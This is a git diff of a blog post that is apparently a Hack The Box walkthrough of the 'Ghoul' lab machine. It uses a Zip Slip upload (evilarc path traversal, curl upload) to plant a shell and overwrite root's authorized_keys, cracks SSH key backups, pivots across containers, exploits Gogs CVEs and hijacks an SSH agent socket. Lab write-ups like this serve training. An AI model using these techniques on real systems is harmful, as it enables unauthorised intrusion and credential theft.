@@ -1,35 +1,51 @@
 ---
 layout: single
 title: Ghoul - Hack The Box
-excerpt: "TBA"
-date: 2019-12-31
+excerpt: "Ghoul was a tricky box from Minatow that required pivoting across 3 containers to find the bits and pieces needed to get root. To get a shell I used a Zip Slip vulnerability in the Java upload app to drop a PHP meterpreter payload on the webserver. After pivoting and scanning the other network segment I found a Gogs application server that is vulnerable and I was able to get a shell there. More credentials were hidden inside an archive file and I was able to use the root shell on one of the container then hijack the SSH agent socket from a connecting root user and hop onto the host OS."
+date: 2019-10-05
 classes: wide
 header:
   teaser: /assets/images/htb-writeup-ghoul/ghoul_logo.png
+  teaser_home_page: true
+  icon: /assets/images/hackthebox.webp
 categories:
   - hackthebox
   - infosec
 tags:
   - linux
-  -
+  - zipslip
+  - git
+  - ssh
+  - unintended
+  - gogs
+  - containers
 ---
 
 ![](/assets/images/htb-writeup-ghoul/ghoul_logo.png)
 
-TBA
+Ghoul was a tricky box from Minatow that required pivoting across 3 containers to find the bits and pieces needed to get root. To get a shell I used a Zip Slip vulnerability in the Java upload app to drop a PHP meterpreter payload on the webserver. After pivoting and scanning the other network segment I found a Gogs application server that is vulnerable and I was able to get a shell there. More credentials were hidden inside an archive file and I was able to use the root shell on one of the container then hijack the SSH agent socket from a connecting root user and hop onto the host OS.
+
+## Summary
+
+- Guess the simple http basic auth credentials for the tomcat web application running on port 8080
+- Exploit the Zip Slip vulnerability in the upload form to upload a meterpreter shell
+- Find SSH keys backups for 3 local users, one of them is encrypted but the password is found in the chat app screenshot
+- Find additional container hosts by uploading a statically compiled nmap binary
+- Identify cronjob of user logging onto one of the container and using the SSH agent
+- Find Gogs application running on another container and pop a shell using CVE-2018-18925 and CVE-2018-20303
+- Download 7zip archive containing a git repo and extract credentials from git reflogs
+- Log in as root to the container on which we found the SSH agent earlier and hijack the private keys of the connecting user to get root access on the host
 
 ### Tools/Blogs used
 
 - [https://github.com/ptoomey3/evilarc](https://github.com/ptoomey3/evilarc)
 - [https://github.com/TheZ3ro/gogsownz](https://github.com/TheZ3ro/gogsownz)
 
-## Detailed steps
-
 ### Portscan
 
-There's two sshd daemons running on this box and they're both running a different version.
-
-Two webservers, one running Apache and the other one Tomcat
+A few observations based on the initial scan:
+- There are two sshd daemons running on this box and they're both running a different version.
+- There are two webservers, one running Apache and the other one Tomcat
 
 ```
 # nmap -sC -sV -p- 10.10.10.101
@@ -61,17 +77,17 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ### Website enumeration on port 80
 
-The website is some kind of Tokyo Ghoul themes website with a homepage, blog and contact section.
+The website is some kind of Tokyo Ghoul themed website with a homepage, blog and contact section.
 
 ![](/assets/images/htb-writeup-ghoul/port80.png)
 
-There's a contact form, that could be a potential target:
+There's a contact form so that could be a potential target for command injection or XSS:
 
 ![](/assets/images/htb-writeup-ghoul/contact.png)
 
-The contact form doesn't seem function because it sends a `POST /bat/MailHandler.php` and that file doesn't exist. This is probably safe to ignore for now.
+The contact form doesn't work because it sends a `POST /bat/MailHandler.php` and that file doesn't exist. This is probably safe to ignore for now.
 
-Like every box with a web component, I'm running gobuster so see if I can find any hidden directories or files.
+Like every box running a webserver, I'm running gobuster to see if I can find any hidden directories or files.
 
 ```
 # gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -x php -u http://10.10.10.101
@@ -86,18 +102,18 @@ Like every box with a web component, I'm running gobuster so see if I can find a
 /users (Status: 301)
 ```
 
-Here, `secret.php`, `/users` and `/uploads` are interesting, but the later gives me a 403 Forbidden message.
+`secret.php`, `/users` and `/uploads` are interesting, but the later gives me a 403 Forbidden message.
 
-The `secret.png` is just an image of some kind of simulate chat application.
+The `secret.pnp` is just an image of some kind of simulated chat application.
 
 ![](/assets/images/htb-writeup-ghoul/secret.png)
 
 I've highlighted above some possibles clues:
 
 - That fake flag/hash is obviously a troll
-- There's a mention of an  RCE, file service, and vsftp. I didn't see FTP open during my portscan however.
+- There's a mention of an RCE, file service, and vsftp. I didn't see FTP open during my portscan however.
 - IP logs, maybe useful for something else
-- X server, but it wasn't seen during the portscan
+- X server, but I didn't see that port open during the portscan
 - ILoveTouka could be a password or part of a password, I'll keep that in mind for later
 
 The `/users` page shows a login page:
@@ -108,7 +124,7 @@ I tried a couple of default logins and looked for SQL injections, no luck. I wil
 
 ### Website enumeration on port 8080
 
-The website is protected with Basic Auth, but I guessed the `admin/admin` log in right on the first try.
+The website is protected with HTTP Basic Auth, but I guessed the `admin/admin` login right on the first try.
 
 Once authenticated, I find another website running on port 8080. It's some generic company website.
 
@@ -142,31 +158,11 @@ And here's the error when uploading another file type:
 
 ![](/assets/images/htb-writeup-ghoul/upload_jpg_nok.png)
 
-So it seems I can only upload ZIP and JPG files and I don't know where they are stored. I ran gobuster on port 8080 but I didn't find anything:
-
-```
-# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.10.101:8080
-
-=====================================================
-Gobuster v2.0.1              OJ Reeves (@TheColonial)
-=====================================================
-[+] Mode         : dir
-[+] Url/Domain   : http://10.10.10.101:8080/
-[+] Threads      : 10
-[+] Wordlist     : /usr/share/seclists/Discovery/Web-Content/big.txt
-[+] Status codes : 200,204,301,302,307,403
-[+] Timeout      : 10s
-=====================================================
-2019/05/06 21:23:44 Starting gobuster
-=====================================================
-=====================================================
-2019/05/06 21:24:03 Finished
-=====================================================
-```
+So it seems I can only upload ZIP and JPG files and I don't know where they are stored. I ran gobuster to try to find an upload folder or something on port 8080 but I didn't find anything.
 
 ### Getting a shell with Zip Slip
 
-There's a wirespread arbitrary file overwrite vulnerability called Zip Slip that affects multiple projects, including Java. The gist of it is we can craft a malicious zip file  that when extracted will place the content to an arbitrary location of our choosing. Normally using file traversal characters would be forbidden but the vulnerability here allow such characters to be processed by Java. In this case, we want to place a reverse shell payload somewhere on the webserver where we can access it and trigger it.
+There's a well known arbitrary file overwrite vulnerability called Zip Slip that affects multiple projects, including Java. The gist of it is we can craft a malicious zip file  that when extracted will place the content to an arbitrary location of our choosing. Normally, using file traversal characters would be forbidden but the vulnerability here allow such characters to be processed by Java. In this case, we want to place a reverse shell payload somewhere on the webserver where we can access it and trigger it.
 
 Details on the vulnerability can be found here: [https://github.com/snyk/zip-slip-vulnerability](https://github.com/snyk/zip-slip-vulnerability)
 
@@ -251,7 +247,6 @@ The note is pretty useless:
 
 ```
 www-data@Aogiri:/var/backups/backups$ cat note.txt
-cat note.txt
 The files from our remote server Ethereal will be saved here. I'll keep updating it overtime, so keep checking.
 ```
 
@@ -259,7 +254,6 @@ But there are SSH keys backups for all three users:
 
 ```
 www-data@Aogiri:/var/backups/backups/keys$ ls -l
-ls -l
 total 12
 -rwxr--r-- 1 root root 1675 Dec 13 13:45 eto.backup
 -rwxr--r-- 1 root root 1766 Dec 13 13:45 kaneki.backup
@@ -275,8 +269,7 @@ noro.backup:   PEM RSA private key
 `eto.backup` and `noro.backup` are unencrypted, but `kaneki.backup` is encrypted:
 
 ```
-www-data@Aogiri:/var/backups/backups/keys$ cat kan
-cat kaneki.backup
+www-data@Aogiri:/var/backups/backups/keys$ cat kaneki.backup
 -----BEGIN RSA PRIVATE KEY-----
 Proc-Type: 4,ENCRYPTED
 DEK-Info: AES-128-CBC,9E9E4E88793BC9DB54A767FC0216491F
@@ -347,26 +340,6 @@ eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         RX errors 0  dropped 0  overruns 0  frame 0
         TX packets 44912  bytes 56773469 (56.7 MB)
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-```
-
-### Unintended way to root on Aogiri container
-
-Instead of using the SSH keys found in the backups directory I can use the Zip Slip vulnerability to upload my own SSH publicy key to the root directory's SSH folder.
-
-```
-# cp /root/.ssh/id_rsa.pub authorized_keys
-# python evilarc.py -f root.zip -o unix -p "../../../../../../root/.ssh" authorized_keys
-Creating root.zip containing ../../../../../../../../../../../../../../root/.ssh/authorized_keys
-# curl -u admin:admin -F 'data=@root.zip' http://10.10.10.101:8080/upload
-```
-
-I can now log in as root:
-
-```
-# ssh 10.10.10.101
-Last login: Tue May  7 00:06:28 2019 from 172.20.0.1
-root@Aogiri:~# id
-uid=0(root) gid=0(root) groups=0(root)
 ```
 
 ### Getting access to kaneki-pc
@@ -491,7 +464,7 @@ kaneki_pub@kaneki-pc:~$ ./procmon.sh
 < ssh root@172.18.0.1 -p 2222 -t ./log.sh
 ```
 
-If I had root access on the container I could get access to the ssh agent socket and hijack the private but I don't have root yet.
+If I had root access on the container I could get access to the ssh agent socket and hijack the private key but I don't have root yet.
 
 Next I scanned the subnet on that other network interface to see if I could find any other hosts there:
 
@@ -529,7 +502,7 @@ ssh -L 2222:172.20.0.150:22 -i root.key root@10.10.10.101
 ssh -i kaneki.backup -p 2222 -L 3000:172.18.0.2:3000 kaneki_pub@127.0.0.1
 ```
 
-### Exploiting Gogs on 3rd container
+### Exploiting Gogs on the 3rd container
 
 On port 3000 we find a Gogs application running:
 
@@ -539,7 +512,7 @@ The version is shown at the bottom of the page:
 
 ![](/assets/images/htb-writeup-ghoul/gogs_version.png)
 
-I tried various credentials and was able to get with pieces of info I found earlier: `AogiriTest / est@aogiri123`
+I tried various credentials and was able to get with pieces of info I found earlier: `AogiriTest / test@aogiri123`
 
 ![](/assets/images/htb-writeup-ghoul/gogs_logged.png)
 
@@ -617,7 +590,9 @@ The root user directory contains a 7zip archive and a `session.sh` file with som
 ```
 3713ea5e4353:~# ls
 aogiri-app.7z  session.sh
+```
 
+```shell
 3713ea5e4353:~# cat session.sh
 #!/bin/bash
 while true
@@ -812,4 +787,24 @@ root@Aogiri:~# ls
 log.sh  root.txt
 root@Aogiri:~# cat root.txt
 7c0f11...
+```
+
+### Unintended way to root on Aogiri container
+
+Instead of using the SSH keys found in the backups directory I can use the Zip Slip vulnerability to upload my own SSH publicy key to the root directory's SSH folder.
+
+```
+# cp /root/.ssh/id_rsa.pub authorized_keys
+# python evilarc.py -f root.zip -o unix -p "../../../../../../root/.ssh" authorized_keys
+Creating root.zip containing ../../../../../../../../../../../../../../root/.ssh/authorized_keys
+# curl -u admin:admin -F 'data=@root.zip' http://10.10.10.101:8080/upload
+```
+
+I can now log in as root:
+
+```
+# ssh 10.10.10.101
+Last login: Tue May  7 00:06:28 2019 from 172.20.0.1
+root@Aogiri:~# id
+uid=0(root) gid=0(root) groups=0(root)
 ```
